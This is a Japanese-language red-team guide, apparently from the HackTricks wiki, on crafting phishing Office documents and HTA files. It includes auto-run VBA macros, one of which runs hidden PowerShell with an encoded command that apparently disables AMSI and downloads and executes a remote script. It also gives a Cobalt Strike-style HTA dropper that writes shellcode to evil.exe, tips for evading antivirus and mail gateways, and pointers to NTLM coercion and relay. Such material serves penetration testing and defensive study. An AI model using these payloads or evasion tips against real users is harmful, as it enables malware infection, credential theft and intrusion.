# フィッシングファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Officeドキュメント

Microsoft Wordはファイルを開く前にファイルデータの検証を行います。データ検証は、OfficeOpenXML標準に対するデータ構造の識別の形で行われます。データ構造の識別中にエラーが発生した場合、分析中のファイルは開かれません。

通常、マクロを含むWordファイルは`.docm`拡張子を使用します。しかし、ファイル拡張子を変更することでファイルの名前を変更し、マクロ実行機能を保持することが可能です。\
例えば、RTFファイルは設計上マクロをサポートしていませんが、DOCMファイルをRTFに名前を変更すると、Microsoft Wordによって処理され、マクロの実行が可能になります。\
同じ内部構造とメカニズムは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に適用されます。

次のコマンドを使用して、いくつかのOfficeプログラムによって実行される拡張子を確認できます：
```bash
assoc | findstr /i "word excel powerp"
```
DOCXファイルは、マクロを含むリモートテンプレートを参照することができ（ファイル – オプション – アドイン – 管理: テンプレート – 移動）、マクロを「実行」することもできます。

### 外部画像の読み込み

次に進む: _挿入 --> クイックパーツ --> フィールド_\
&#xNAN;_**カテゴリ**: リンクと参照, **フィールド名**: includePicture, **ファイル名またはURL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### マクロバックドア

マクロを使用して、ドキュメントから任意のコードを実行することが可能です。

#### 自動ロード関数

一般的であればあるほど、AVがそれらを検出する可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロコードの例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除する

**ファイル > 情報 > ドキュメントの検査 > ドキュメントの検査**に移動すると、ドキュメントインスペクターが表示されます。**検査**をクリックし、次に**ドキュメントのプロパティと個人情報**の横にある**すべて削除**をクリックします。

#### ドキュメント拡張子

完了したら、**ファイルの種類**のドロップダウンを選択し、形式を**`.docx`**から**Word 97-2003 `.doc`**に変更します。\
これは、**`.docx`**内にマクロを保存できず、マクロ対応の**`.docm`**拡張子には**スティグマ**があるためです（例：サムネイルアイコンに大きな`!`があり、一部のウェブ/メールゲートウェイはそれらを完全にブロックします）。したがって、この**レガシー`.doc`拡張子が最良の妥協案です**。

#### 悪意のあるマクロ生成ツール

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTAファイル

HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせたWindowsプログラム**です。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約なしに「完全に信頼された」アプリケーションとして実行されます。

HTAは**`mshta.exe`**を使用して実行され、通常は**Internet Explorer**と一緒に**インストール**されるため、**`mshta`はIEに依存しています**。したがって、IEがアンインストールされている場合、HTAは実行できません。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM認証の強制

**リモートでNTLM認証を強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールやHTMLに**見えない画像**を追加することができます（HTTP MitMでも？）。または、被害者に**フォルダを開くだけで**認証を**トリガー**する**ファイルのアドレス**を送信することもできます。

**次のページでこれらのアイデアやその他を確認してください：**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLMリレー

ハッシュや認証を盗むだけでなく、**NTLMリレー攻撃を実行する**こともできることを忘れないでください：

- [**NTLMリレー攻撃**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLMリレーから証明書へ)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
